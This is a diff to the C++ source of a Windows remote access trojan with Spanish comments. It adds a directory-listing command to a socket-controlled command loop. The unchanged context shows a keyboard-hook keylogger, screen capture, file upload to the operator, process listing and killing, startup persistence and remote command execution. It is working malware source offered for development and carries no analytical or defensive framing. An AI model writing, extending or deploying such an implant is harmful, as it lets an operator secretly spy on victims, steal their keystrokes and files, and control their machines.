@@ -8,7 +8,8 @@
 #include <fstream>  
 #include <vector>   
 #include <gdiplus.h> 
-#include <tlhelp32.h> // Necesario para el Pack de Herramientas (Procesos)
+#include <tlhelp32.h>
+#include <filesystem> // Necesario para el File Explorer (C++17)
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -16,6 +17,7 @@
 #pragma comment(lib, "gdi32.lib")    
 
 using namespace Gdiplus; 
+namespace fs = std::filesystem; // Alias para facilitar el uso
 
 std::string registroTeclas = "";
 
@@ -41,7 +43,6 @@ std::string listarProcesos() {
 
     if (Process32First(hSnapshot, &pe32)) {
         do {
-            // Formato que el Dashboard espera: PID:Nombre|
             resultado += std::to_string(pe32.th32ProcessID) + ":" + pe32.szExeFile + "|";
         } while (Process32Next(hSnapshot, &pe32));
     }
@@ -61,7 +62,23 @@ std::string matarProceso(int pid) {
     return "ERROR: No se pudo terminar el proceso.\n";
 }
 
-// --- 3. FUNCIÓN PARA ENVIAR ARCHIVOS ---
+// --- 3. EXPLORADOR DE ARCHIVOS (NUEVO) ---
+std::string listarDirectorio(std::string ruta) {
+    std::string resultado = "--- FILES ---\n";
+    try {
+        if (!fs::exists(ruta)) return "ERROR: La ruta no existe.\n";
+        
+        for (const auto& entry : fs::directory_iterator(ruta)) {
+            std::string tipo = entry.is_directory() ? "[DIR]" : "[FILE]";
+            resultado += tipo + " " + entry.path().filename().string() + "|";
+        }
+    } catch (const std::exception& e) {
+        return "ERROR: " + std::string(e.what()) + "\n";
+    }
+    return resultado;
+}
+
+// --- 4. FUNCIÓN PARA ENVIAR ARCHIVOS ---
 void enviarArchivo(SOCKET sock, std::string ruta) {
     std::ifstream file(ruta, std::ios::binary | std::ios::ate);
     if (!file.is_open()) {
@@ -84,7 +101,7 @@ void enviarArchivo(SOCKET sock, std::string ruta) {
     file.close();
 }
 
-// --- 4. FUNCIONES PARA CAPTURA DE PANTALLA ---
+// --- 5. FUNCIONES PARA CAPTURA DE PANTALLA ---
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
     UINT num = 0, size = 0;
     GetImageEncodersSize(&num, &size);
@@ -138,7 +155,7 @@ void capturarPantalla(SOCKET sock) {
     DeleteFileA(rutaImg.c_str());
 }
 
-// --- 5. KEYLOGGER ---
+// --- 6. KEYLOGGER ---
 LRESULT CALLBACK HookTeclado(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
@@ -160,7 +177,7 @@ void IniciarKeylogger() {
     UnhookWindowsHookEx(hhkLowLevelKybd);
 }
 
-// --- 6. PERSISTENCIA Y RCE ---
+// --- 7. PERSISTENCIA Y RCE ---
 void instalarPersistencia() {
     char rutaPropia[MAX_PATH];
     GetModuleFileNameA(NULL, rutaPropia, MAX_PATH);
@@ -181,7 +198,7 @@ std::string ejecutarComando(const char* cmd) {
     return resultado;
 }
 
-// --- 7. MAIN (BUCLE DE COMANDOS ACTUALIZADO) ---
+// --- 8. MAIN ---
 int main() {
     instalarPersistencia();
     std::thread(IniciarKeylogger).detach(); 
@@ -218,6 +235,11 @@ int main() {
         }
         else if (comando == "ps") {
             std::string lista = listarProcesos();
+            send(sock, lista.c_str(), (int)lista.length(), 0);
+        }
+        else if (comando.find("ls ") == 0) { // COMANDO FILE EXPLORER
+            std::string ruta = comando.substr(3);
+            std::string lista = listarDirectorio(ruta);
             send(sock, lista.c_str(), (int)lista.length(), 0);
         }
         else if (comando.find("kill ") == 0) {
